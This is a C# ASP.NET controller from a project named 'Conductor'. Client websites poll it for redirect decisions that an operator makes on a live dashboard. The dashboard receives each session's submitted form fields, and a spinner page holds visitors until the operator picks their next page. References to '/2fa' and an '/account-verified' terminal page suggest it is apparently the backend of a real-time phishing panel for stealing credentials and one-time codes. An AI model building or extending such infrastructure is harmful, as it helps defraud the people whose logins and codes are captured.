using Conductor.Db;
using Conductor.Models;
using Conductor.RealTime;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;

namespace Conductor.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class RedirectController : ControllerBase
    {
        private readonly AppDb _db;
        private readonly ILogger<RedirectController> _logger;
        private readonly IHubContext<DashboardHub> _hub;

        public RedirectController(AppDb db, ILogger<RedirectController> logger, IHubContext<DashboardHub> hub)
        {
            _db = db;
            _logger = logger;
            _hub = hub;
        }

        /// <summary>
        /// This endpoint is polled by client websites to get their next redirect destination
        /// </summary>
        [HttpGet("next")]
        public async Task<IActionResult> GetNextRedirect()
        {
            if (!HttpContext.Items.TryGetValue("sessionId", out var sessionIdObj) || sessionIdObj is not int sessionId)
            {
                return BadRequest(new { message = "Session not found or invalid" });
            }

            // Only return a decision that corresponds to the LATEST submission for this session.
            // This prevents replaying old decisions after new submissions (e.g., reloading /2fa).
            var latestSubmissionId = await _db.Submissions
                .Where(s => s.SessionId == sessionId)
                .OrderByDescending(s => s.Id)
                .Select(s => (int?)s.Id)
                .FirstOrDefaultAsync();

            // No submission yet – nothing to decide against
            if (latestSubmissionId == null)
                return Ok(new { wait = true, message = "No redirect available" });

            // Find decided step for the latest submission only
            var nextStep = await _db.NextSteps
                .Where(ns => ns.SessionId == sessionId && ns.SubmissionId == latestSubmissionId && ns.Status == "decided")
                .OrderByDescending(ns => ns.Id)
                .FirstOrDefaultAsync();

            if (nextStep == null)
                return Ok(new { wait = true, message = "No redirect available" });

            // Mark as processed (consumed by client)
            nextStep.Status = "processed";
            await _db.SaveChangesAsync();

            // Notify dashboards that redirect has been processed - preserve submission data
            var latestSub = _db.Submissions
                .Where(sub => sub.SessionId == sessionId)
                .OrderByDescending(sub => sub.Id)
                .FirstOrDefault();

            // Decide if this redirect leads to terminal page using configured TerminalPath
            var redirectPath = nextStep.RedirectPath ?? string.Empty;
            var site = await _db.Sites.FindAsync(nextStep.SiteId);
            var terminalPath = site?.TerminalPath ?? "/account-verified";
            // Normalise by trimming trailing slashes and lowering case
            string Norm(string s) => (s ?? "").Trim().TrimEnd('/').ToLowerInvariant();
            var isTerminal = Norm(redirectPath) == Norm(terminalPath);

            // Load session to provide consistent payload (isActive)
            var session = await _db.Sessions.FindAsync(sessionId);
            var sessionUpdate = new
            {
                id = sessionId,
                sessionId = sessionId,
                status = isTerminal ? "live" : "live", // keep live; completion confirmed via /complete
                lastSeenAt = DateTimeOffset.UtcNow,
                isActive = session?.IsActive ?? true,
                latestSubmission = latestSub != null ? new {
                    pageId = latestSub.PageId,
                    createdAt = latestSub.CreatedAt,
                    fields = DashboardController.ExtractSanitizedFields(latestSub.Payload.RootElement)
                } : (object?)null
            };

            await _hub.Clients.Group("dashboard").SendAsync("sessionUpdated", sessionUpdate);

            return Ok(new { redirect = nextStep.RedirectPath, wait = false });
        }

        /// <summary>
        /// This endpoint returns a polling page that clients can embed
        /// </summary>
        [HttpGet("poller")]
        public IActionResult GetPollerPage()
        {
            var sessionId = HttpContext.Items["sessionId"];
            var baseUrl = $"{Request.Scheme}://{Request.Host}";
            
            var html = $@"
<!DOCTYPE html>
<html>
<head>
    <title>Conductor Redirect Poller</title>
    <style>
        body {{ 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #f5f5f5;
        }}
        .poller {{ 
            text-align: center; 
            background: white; 
            padding: 2rem; 
            border-radius: 8px; 
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .spinner {{ 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 1rem;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class='poller'>
        <div class='spinner'></div>
        <h3>Waiting for redirect...</h3>
        <p>Session: {sessionId}</p>
    </div>
    <script>
        async function checkRedirect() {{
            try {{
                const response = await fetch('{baseUrl}/api/redirect/next');
                const data = await response.json();
                
                if (data.redirect && !data.wait) {{
                    window.location.href = data.redirect;
                }} else {{
                    setTimeout(checkRedirect, 2000); // Poll every 2 seconds
                }}
            }} catch (error) {{
                console.error('Polling error:', error);
                setTimeout(checkRedirect, 5000); // Retry after 5 seconds on error
            }}
        }}
        
        // Start polling
        checkRedirect();
    </script>
</body>
</html>";

            return Content(html, "text/html");
        }

        /// <summary>
        /// Health check for the redirect service
        /// </summary>
        [HttpGet("health")]
        public IActionResult Health()
        {
            var sessionId = HttpContext.Items["sessionId"];
            return Ok(new { 
                status = "healthy", 
                sessionId = sessionId,
                timestamp = DateTimeOffset.UtcNow 
            });
        }
    }
}
